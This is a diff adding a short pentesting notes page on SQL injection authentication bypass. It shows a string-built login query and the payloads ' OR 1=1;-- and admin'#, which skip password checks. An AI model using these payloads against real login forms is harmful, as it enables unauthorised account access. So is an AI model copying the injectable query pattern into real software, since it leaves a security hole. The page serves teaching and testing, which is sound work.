@@ -1,0 +1,54 @@
+---
+layout:
+  title:
+    visible: true
+  description:
+    visible: false
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
+---
+
+# Authentication Bypass
+
+This method consists of considering that the web application isn't interested in the content of the username and password, but in making a matching pair in the users' table.
+
+* We assume the database uses a basic query for authentication
+
+{% code overflow="wrap" lineNumbers="true" %}
+```sql
+SELECT * from users WHERE username='%user%' and password='%password%' LIMIT 1;
+```
+{% endcode %}
+
+{% hint style="info" %}
+_%user%_ and _%password%_ are the values received on a login form
+{% endhint %}
+
+***
+
+* We can do a malicious insertion on the password field
+
+{% code overflow="wrap" lineNumbers="true" %}
+```sql
+' OR 1=1;--   #Use this comparison to cheat on verification
+#This will skip the password verification and enumerate all the users
+```
+{% endcode %}
+
+{% hint style="warning" %}
+After the `;--` is mandatory to put a space
+{% endhint %}
+
+***
+
+* On PHP-based pages, we can replicate the same with a different payload
+
+{% code overflow="wrap" lineNumbers="true" %}
+```java
+admin'#      //Insert this to skip the password verification
+```
+{% endcode %}
